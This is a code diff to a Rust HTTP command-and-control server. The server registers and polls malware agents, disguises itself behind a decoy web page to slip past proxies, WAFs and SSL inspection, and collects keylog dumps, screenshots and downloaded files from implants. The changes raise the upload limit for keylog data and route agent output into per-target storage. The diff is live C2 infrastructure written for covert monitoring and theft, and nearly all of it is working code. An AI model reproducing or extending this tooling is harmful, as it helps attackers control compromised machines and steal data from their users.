@@ -5,11 +5,11 @@
 // traverse corporate proxies, WAFs, and SSL inspection appliances.
 //
 // Protocol:
-//   POST /                     → Agent registration (ClientHello JSON in body)
+//   POST /                     -> Agent registration (ClientHello JSON in body)
 //                                Returns session_token + queued commands
-//   GET  /<profile_get_uri>    → Agent polls for commands (session_token in cookie)
+//   GET /<profile_get_uri>    -> Agent polls for commands (session_token in cookie)
 //                                Returns commands or empty 200
-//   POST /<profile_post_uri>   → Agent sends command responses (body = result JSON)
+//   POST /<profile_post_uri>   -> Agent sends command responses (body = result JSON)
 //
 // Non-C2 traffic gets a decoy page so the listener looks like a normal web server.
 
@@ -57,7 +57,7 @@ pub struct HttpC2State {
     pub results: SharedResults,
     pub inner: Mutex<HttpInner>,
     /// Counts how many times the inner mutex was recovered from a poison state.
-    /// If this exceeds a threshold, new registrations are refused — operating
+    /// If this exceeds a threshold, new registrations are refused - operating
     /// on potentially corrupted state is worse than downtime.
     poison_count: std::sync::atomic::AtomicU32,
 }
@@ -164,7 +164,7 @@ impl HttpC2State {
         });
 
         // Remove stale sessions from all maps. Use a HashSet for O(1) lookups
-        // during the token_map retain — the old code called retain() inside a
+        // during the token_map retain - the old code called retain() inside a
         // for loop, creating O(N*M) complexity that blocked the mutex during
         // large cleanup cycles, freezing all HTTP C2 traffic.
         let stale_set: std::collections::HashSet<u32> = stale_ids.iter().copied().collect();
@@ -178,7 +178,7 @@ impl HttpC2State {
         // Single O(M) pass over token_map instead of N × O(M)
         inner.token_map.retain(|_, v| !stale_set.contains(v));
 
-        // Also remove from the central SharedSessions DashMap — the old code
+        // Also remove from the central SharedSessions DashMap - the old code
         // forgot this, leaking Session structs (channels, keys, metadata)
         // indefinitely until OOM.
         for &sid in &stale_set {
@@ -201,6 +201,10 @@ pub async fn start(
         .route("/", post(handle_register))
         .route("/register", post(handle_register))
         .fallback(any(handle_c2_or_decoy))
+        // C2 POST bodies can be large (chunked downloads ~2.8 MB, keylog
+        // dumps); axum's 2 MiB DefaultBodyLimit would 413 them. Mirror the
+        // API router's 50 MB cap (src/api/mod.rs).
+        .layer(axum::extract::DefaultBodyLimit::max(50 * 1024 * 1024))
         .with_state(state.clone());
 
     let addr = SocketAddr::from(([0, 0, 0, 0], port));
@@ -227,7 +231,7 @@ pub async fn start(
     }
 }
 
-/// POST / — Agent registration. Receives ClientHello, returns session token.
+/// POST / - Agent registration. Receives ClientHello, returns session token.
 async fn handle_register(
     State(state): State<Arc<HttpC2State>>,
     _headers: HeaderMap,
@@ -263,7 +267,7 @@ async fn handle_register(
                     // Replay protection: reject registrations with stale or missing
                     // timestamps. The timestamp is included in the HMAC, so an
                     // attacker can't forge one. But an empty timestamp skipped
-                    // this entire check — reject it when a challenge_key exists.
+                    // this entire check - reject it when a challenge_key exists.
                     if hello.reg_timestamp.is_empty() {
                         warn!("Missing reg_timestamp from {} for build {} (replay attempt?)", addr.ip(), hello.build_id);
                         return decoy_page().into_response();
@@ -284,7 +288,7 @@ async fn handle_register(
                     type HmacSha256 = Hmac<Sha256>;
                     // The challenge_key is stored as raw bytes (BLOB) in the DB.
                     // The agent decodes the base64 config value to get the same
-                    // raw bytes. Use them directly — no decoding needed here.
+                    // raw bytes. Use them directly - no decoding needed here.
                     let ck_decoded = ck.clone();
                     if let Ok(mut mac) = <HmacSha256 as Mac>::new_from_slice(&ck_decoded) {
                         // Length-prefix each field before hashing to prevent
@@ -354,6 +358,12 @@ async fn handle_register(
             &hello.os, &addr.ip().to_string(), &hello.build_id, &profile_name,
         );
     }
+
+    // Seed the RCM package fingerprint for this target (SPEC §5.3) - but
+    // ONLY if a package already exists on disk. Registration (especially
+    // from unauthenticated legacy builds) must never create a package
+    // directory tree; packages are created lazily on the first artifact.
+    crate::server::session::seed_rcm_fingerprint(&hello.hostname, &hello.computer_id, &hello.os);
 
     // Register session in shared state
     // The tx channel is what the API uses to send commands. We bridge it
@@ -477,24 +487,13 @@ async fn handle_c2_or_decoy(
             }
         }
         axum::http::Method::POST => {
-            // Agent sending command response
+            // Agent sending command response. Route through the TLS path's
+            // process_response so HTTP-transported agents populate RCM
+            // packages (file:/keylog/screenshot handling). process_response
+            // performs the results-map insert and DB save itself - no
+            // duplicate persistence here.
             if let Ok(resp) = serde_json::from_slice::<CommandResponse>(&body) {
-                state.results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, resp.request_id), resp.clone());
-
-                // Capture output before spawn_blocking moves resp
-                let output_copy = resp.output.clone();
-
-                // Persist to DB
-                let db = state.db.clone();
-                tokio::task::spawn_blocking(move || {
-                    if let Ok(conn) = db.get() {
-                        database::save_client_output(&conn, sess_id, resp.request_id, &resp.output, &resp.error);
-                    }
-                });
-
-                if !output_copy.trim().is_empty() {
-                    println!("\n[HTTP Sess {} Output]\n{}", sess_id, crate::utils::strip_ansi(output_copy.trim()));
-                }
+                crate::server::session::process_response(sess_id, resp, &state.results, &state.db).await;
             }
             (StatusCode::OK, "").into_response()
         }
